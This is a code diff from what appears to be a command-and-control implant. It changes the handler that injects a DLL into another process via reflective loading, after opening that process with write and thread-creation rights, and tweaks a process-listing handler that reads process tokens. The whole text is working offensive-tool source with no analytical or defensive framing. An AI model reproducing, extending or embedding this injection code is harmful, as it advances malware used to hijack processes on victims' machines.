@@ -613,7 +613,7 @@ VOID CommandProcList(
             );
 
             /* query data based on the process handle */
-            if ( Process != INVALID_HANDLE_VALUE )
+            if ( Process )
             {
                 /* open a process token handle */
                 if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( Process, TOKEN_QUERY, &Token ) ) ) {
@@ -1143,12 +1143,11 @@ VOID CommandInjectDLL( PPARSER Parser )
 
     UINT32            DllSize    = 0;
     DWORD             Result     = 1;
-    NTSTATUS          NtStatus   = STATUS_SUCCESS;
+    NTSTATUS          NtStatus   = STATUS_UNSUCCESSFUL;
     PBYTE             DllBytes   = NULL;
     UINT32            DllLdrSize = 0;
     PBYTE             DllLdr     = NULL;
     HANDLE            hProcess   = NULL;
-    CLIENT_ID         ProcID     = { 0 };
     OBJECT_ATTRIBUTES ObjAttr    = { sizeof( ObjAttr ) };
     INJECTION_CTX     InjCtx     = { 0 };
 
@@ -1158,21 +1157,22 @@ VOID CommandInjectDLL( PPARSER Parser )
     DllBytes         = ParserGetBytes( Parser, &DllSize );
     InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );
 
+    PUTS( "CommandInjectDLL" )
     PRINTF( "Technique: %d\n", InjCtx.Technique )
     PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
     PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
     PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );
 
-    ProcID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) InjCtx.ProcessID;
+    hProcess = ProcessOpen( InjCtx.ProcessID, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION );
 
-    if ( NT_SUCCESS( NtStatus = SysNtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
+    if ( hProcess )
     {
         Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
+        SysNtClose( hProcess );
     }
     else
     {
-        PUTS( "[-] NtOpenProcess: Failed to open process" )
-        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
     }
 
     PRINTF( "Injected Result: %d\n", Result )
